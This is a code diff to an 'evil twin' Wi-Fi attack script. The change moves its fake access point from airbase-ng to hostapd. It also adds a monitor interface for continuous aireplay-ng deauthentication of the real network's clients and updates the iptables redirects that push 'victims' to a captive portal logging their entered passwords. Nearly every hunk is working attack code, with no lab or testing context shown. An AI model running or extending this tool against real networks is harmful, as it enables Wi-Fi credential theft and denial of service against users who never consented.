@@ -46,6 +46,8 @@ AP_RANGE_END=192.168.3.60
 
 DHCPD_CONF="/etc/dhcp/et-auto-dhcpd.conf"
 DHCPD_LEASES="/var/lib/dhcp/dhcpd.leases-et-auto"
+AP_IFACE=""
+MON_IFACE=""
 
 ###########################################
 # Get information of the chipset.
@@ -223,6 +225,10 @@ check_programs() {
 
     if ! [ -x "$(command -v openssl 2>&1)" ]; then
         missing_packages="${missing_packages} openssl"
+    fi
+
+    if ! [ -x "$(command -v hostapd 2>&1)" ]; then
+        missing_packages="${missing_packages} hostapd"
     fi
 
     if [ -n "${missing_packages}" ]; then
@@ -725,6 +731,7 @@ import http.server, urllib.parse, sys, os, datetime, ssl, socket, threading
 ESSID = sys.argv[1] if len(sys.argv) > 1 else "Network"
 LOG_FILE = sys.argv[2] if len(sys.argv) > 2 else "/tmp/passwords.txt"
 HTTP_PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 80
+AP_IFACE = sys.argv[4] if len(sys.argv) > 4 else "at0"
 HTTPS_PORT = 443
 
 CERT_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "server.crt")
@@ -816,9 +823,9 @@ class Handler(http.server.BaseHTTPRequestHandler):
 
         import subprocess, signal, os
         AUTHED = True
-        subprocess.run(["iptables", "-t", "nat", "-D", "PREROUTING", "-i", "at0", "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", "80"], capture_output=True)
-        subprocess.run(["iptables", "-t", "nat", "-D", "PREROUTING", "-i", "at0", "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-port", "443"], capture_output=True)
-        subprocess.run(["iptables", "-t", "nat", "-D", "PREROUTING", "-i", "at0", "-p", "udp", "--dport", "53", "-j", "REDIRECT", "--to-port", "53"], capture_output=True)
+        subprocess.run(["iptables", "-t", "nat", "-D", "PREROUTING", "-i", AP_IFACE, "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", "80"], capture_output=True)
+        subprocess.run(["iptables", "-t", "nat", "-D", "PREROUTING", "-i", AP_IFACE, "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-port", "443"], capture_output=True)
+        subprocess.run(["iptables", "-t", "nat", "-D", "PREROUTING", "-i", AP_IFACE, "-p", "udp", "--dport", "53", "-j", "REDIRECT", "--to-port", "53"], capture_output=True)
         try:
             with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "dns_server.pid")) as f:
                 pid = int(f.read().strip())
@@ -897,6 +904,7 @@ notify_clients() {
 cleanup() {
     echo ""
     echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Cleaning up...${WHITE}"
+    pkill -f "hostapd" 2>/dev/null || true
     pkill -f "airbase-ng" 2>/dev/null || true
     pkill -f "aireplay-ng" 2>/dev/null || true
     pkill -f "dhcpd" 2>/dev/null || true
@@ -904,15 +912,27 @@ cleanup() {
         ip link set "${iface}" down 2>/dev/null || true
         iw dev "${iface}" del 2>/dev/null || true
     done
+    if [ -n "${MON_IFACE:-}" ]; then
+        ip link set "${MON_IFACE}" down 2>/dev/null || true
+        iw dev "${MON_IFACE}" del 2>/dev/null || true
+    fi
     pkill -f "captive_portal.py" 2>/dev/null || true
     pkill -f "dns_server.py" 2>/dev/null || true
     [ -n "${CLIENT_WATCHER_PID:-}" ] && kill "${CLIENT_WATCHER_PID}" 2>/dev/null || true
-    iptables -t nat -D PREROUTING -i at0 -p tcp --dport 80 -j REDIRECT --to-port 80 2>/dev/null || true
-    iptables -t nat -D PREROUTING -i at0 -p tcp --dport 443 -j REDIRECT --to-port 443 2>/dev/null || true
-    iptables -t nat -D PREROUTING -i at0 -p udp --dport 53 -j REDIRECT --to-port 53 2>/dev/null || true
-    iptables -D FORWARD -i at0 -o "${lan}" -j ACCEPT 2>/dev/null || true
-    iptables -D FORWARD -i "${lan}" -o at0 -m state --state ESTABLISHED,RELATED -j ACCEPT 2>/dev/null || true
+    local ap_iface="${AP_IFACE:-at0}"
+    iptables -t nat -D PREROUTING -i "${ap_iface}" -p tcp --dport 80 -j REDIRECT --to-port 80 2>/dev/null || true
+    iptables -t nat -D PREROUTING -i "${ap_iface}" -p tcp --dport 443 -j REDIRECT --to-port 443 2>/dev/null || true
+    iptables -t nat -D PREROUTING -i "${ap_iface}" -p udp --dport 53 -j REDIRECT --to-port 53 2>/dev/null || true
+    iptables -D FORWARD -i "${ap_iface}" -o "${lan}" -j ACCEPT 2>/dev/null || true
+    iptables -D FORWARD -i "${lan}" -o "${ap_iface}" -m state --state ESTABLISHED,RELATED -j ACCEPT 2>/dev/null || true
     iptables -t nat -D POSTROUTING -o "${lan}" -j MASQUERADE 2>/dev/null || true
+    if [ -n "${AP_IFACE:-}" ]; then
+        ifconfig "${AP_IFACE}" down 2>/dev/null || true
+        ip addr flush dev "${AP_IFACE}" 2>/dev/null || true
+        iwconfig "${AP_IFACE}" mode managed 2>/dev/null || true
+        ip link set "${AP_IFACE}" up 2>/dev/null || true
+        nmcli device set "${AP_IFACE}" managed yes 2>/dev/null || true
+    fi
     rm -f "${DHCPD_CONF}" "${DHCPD_LEASES}" 2>/dev/null || true
     echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Done.${WHITE}"
     if [ -s "${TMP_DIR}/passwords.txt" ]; then
@@ -994,21 +1014,40 @@ main() {
                     clear
                     print_header
                     echo ""
-                    echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Starting fake access point...${WHITE}"
-                    run_background "airbase-ng -e '${selected_essid}' -c ${selected_channel} ${wlan}" "airbase-ng"
+                    echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Starting fake access point (hostapd)...${WHITE}"
 
-                    echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Waiting for at0 interface...${WHITE}"
-                    local at0_timeout=10
-                    while [ "$(ip -o link show at0 2>/dev/null)" = "" ] && [ "${at0_timeout}" -gt 0 ]; do
+                    nmcli device set "${wlan}" managed no 2>/dev/null || true
+                    ifconfig "${wlan}" down
+                    iwconfig "${wlan}" mode managed
+                    ifconfig "${wlan}" up
+
+                    cat > "${TMP_DIR}/hostapd.conf" << HCONF
+interface=${wlan}
+driver=nl80211
+ssid=${selected_essid}
+hw_mode=g
+channel=${selected_channel}
+auth_algs=1
+ignore_broadcast_ssid=0
+HCONF
+
+                    run_background "hostapd ${TMP_DIR}/hostapd.conf" "hostapd"
+
+                    echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Waiting for AP mode...${WHITE}"
+                    local ap_timeout=15
+                    while [ "${ap_timeout}" -gt 0 ]; do
+                        if iw dev "${wlan}" info 2>/dev/null | grep -q 'type AP'; then
+                            break
+                        fi
                         sleep 1
-                        at0_timeout=$((at0_timeout - 1))
+                        ap_timeout=$((ap_timeout - 1))
                     done
 
-                    if [ "$(ip -o link show at0 2>/dev/null)" = "" ]; then
-                        echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} at0 interface not created. Check logs:${BOLD_YELLOW} ${TMP_DIR}/airbase-ng.log${WHITE}"
-                        if [ -f "${TMP_DIR}/airbase-ng.log" ]; then
-                            echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} airbase-ng output:${WHITE}"
-                            cat "${TMP_DIR}/airbase-ng.log"
+                    if ! iw dev "${wlan}" info 2>/dev/null | grep -q 'type AP'; then
+                        echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} AP failed to start. Check log:${BOLD_YELLOW} ${TMP_DIR}/hostapd.log${WHITE}"
+                        if [ -f "${TMP_DIR}/hostapd.log" ]; then
+                            echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} hostapd output:${WHITE}"
+                            cat "${TMP_DIR}/hostapd.log"
                         fi
                         echo ""
                         echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Use the Atheros AR9271 (ID 3) for the fake AP, not Intel 3165.${WHITE}"
@@ -1016,20 +1055,19 @@ main() {
                         result='main'
                         continue
                     fi
+                    AP_IFACE="${wlan}"
 
                     echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Configuring network for victims...${WHITE}"
                     create_dhcpd_config_file
 
-                    ifconfig at0 up
-                    ifconfig at0 ${AP_ROUTER} netmask ${AP_MASK}
-                    route add -net ${AP_SUBNET} netmask ${AP_MASK} gw ${AP_ROUTER}
+                    ifconfig "${wlan}" ${AP_ROUTER} netmask ${AP_MASK} up
 
                     iptables -P FORWARD ACCEPT
                     echo "1" > /proc/sys/net/ipv4/ip_forward
 
                     if [ -n "${lan}" ]; then
-                        iptables -A FORWARD -i at0 -o "${lan}" -j ACCEPT
-                        iptables -A FORWARD -i "${lan}" -o at0 -m state --state ESTABLISHED,RELATED -j ACCEPT
+                        iptables -A FORWARD -i "${wlan}" -o "${lan}" -j ACCEPT
+                        iptables -A FORWARD -i "${lan}" -o "${wlan}" -m state --state ESTABLISHED,RELATED -j ACCEPT
                         iptables -t nat -A POSTROUTING -o "${lan}" -j MASQUERADE
                     else
                         echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} No internet interface selected. Victims will have no internet access.${WHITE}"
@@ -1037,18 +1075,18 @@ main() {
 
                     echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Starting DHCP server...${WHITE}"
                     touch "${DHCPD_LEASES}"
-                    run_background "dhcpd -d -cf \"${DHCPD_CONF}\" -lf \"${DHCPD_LEASES}\" at0 2>&1 | tee -a ${TMP_DIR}/clts.txt" "dhcpd"
+                    run_background "dhcpd -d -cf \"${DHCPD_CONF}\" -lf \"${DHCPD_LEASES}\" ${wlan} 2>&1 | tee -a ${TMP_DIR}/clts.txt" "dhcpd"
                     notify_clients &
                     CLIENT_WATCHER_PID=$!
 
                     echo ""
-                    echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Attack running! Fake AP: ${BOLD_YELLOW}${selected_essid}${GREEN} on ${BOLD_PURPLE}at0${WHITE}"
+                    echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Attack running! Fake AP: ${BOLD_YELLOW}${selected_essid}${GREEN} on ${BOLD_PURPLE}${wlan}${WHITE}"
                     if [ -n "${lan}" ]; then
                         echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Internet access: ${BOLD_YELLOW}Enabled${WHITE}"
                     else
                         echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} Internet access: ${BOLD_RED}Disabled${WHITE}"
                     fi
-                    echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Check: ${BOLD_CYAN}${TMP_DIR}/{airbase-ng,dhcpd,aireplay-ng}.log${GREEN}, passwords: ${BOLD_CYAN}${TMP_DIR}/passwords.txt${WHITE}"
+                    echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Check: ${BOLD_CYAN}${TMP_DIR}/{hostapd,dhcpd,aireplay-ng}.log${GREEN}, passwords: ${BOLD_CYAN}${TMP_DIR}/passwords.txt${WHITE}"
                     echo ""
                     echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Commands: ${BOLD_YELLOW}[d]${GREEN}eauth ${WHITE}| ${BOLD_YELLOW}[c]${GREEN}aptive portal ${WHITE}| ${BOLD_YELLOW}[s]${GREEN}tatus ${WHITE}| ${BOLD_YELLOW}[q]${GREEN}uit${WHITE}"
                     deauth_running=false
@@ -1061,8 +1099,18 @@ main() {
                             d|D)
                                 if [ "${deauth_running}" == false ]; then
                                     echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Deauthing clients from ${BOLD_YELLOW}${selected_essid}${WHITE}..."
-                                    iwconfig ${wlan} channel ${selected_channel} 2>/dev/null
-                                    run_background "aireplay-ng -0 0 -a ${selected_bssid} ${wlan} --ignore-negative-one" "aireplay-ng"
+                                    if [ -z "${MON_IFACE}" ]; then
+                                        MON_IFACE="mon0"
+                                        local mon_n=0
+                                        while ip -o link show "${MON_IFACE}" &>/dev/null; do
+                                            mon_n=$((mon_n + 1))
+                                            MON_IFACE="mon${mon_n}"
+                                        done
+                                        iw dev "${wlan}" interface add "${MON_IFACE}" type monitor
+                                        ip link set "${MON_IFACE}" up
+                                    fi
+                                    iwconfig "${MON_IFACE}" channel ${selected_channel} 2>/dev/null
+                                    run_background "aireplay-ng -0 0 -a ${selected_bssid} ${MON_IFACE} --ignore-negative-one" "aireplay-ng"
                                     deauth_running=true
                                 else
                                     echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} Deauth already running.${WHITE}"
@@ -1073,12 +1121,12 @@ main() {
                                     echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Starting captive portal...${WHITE}"
                                     create_captive_portal "${selected_essid}"
 
-                                    iptables -t nat -A PREROUTING -i at0 -p tcp --dport 80 -j REDIRECT --to-port 80
-                                    iptables -t nat -A PREROUTING -i at0 -p tcp --dport 443 -j REDIRECT --to-port 443
-                                    iptables -t nat -A PREROUTING -i at0 -p udp --dport 53 -j REDIRECT --to-port 53
+                                    iptables -t nat -A PREROUTING -i "${wlan}" -p tcp --dport 80 -j REDIRECT --to-port 80
+                                    iptables -t nat -A PREROUTING -i "${wlan}" -p tcp --dport 443 -j REDIRECT --to-port 443
+                                    iptables -t nat -A PREROUTING -i "${wlan}" -p udp --dport 53 -j REDIRECT --to-port 53
 
                                     run_background "python3 ${TMP_DIR}/dns_server.py ${AP_ROUTER} ${TMP_DIR}/dns_server.log" "dns_server"
-                                    run_background "python3 ${TMP_DIR}/captive_portal.py '${selected_essid}' ${TMP_DIR}/passwords.txt 80" "captive_portal"
+                                    run_background "python3 ${TMP_DIR}/captive_portal.py '${selected_essid}' ${TMP_DIR}/passwords.txt 80 ${wlan}" "captive_portal"
 
                                     echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Captive portal running. Passwords logged to ${BOLD_CYAN}${TMP_DIR}/passwords.txt${WHITE}"
                                     portal_running=true
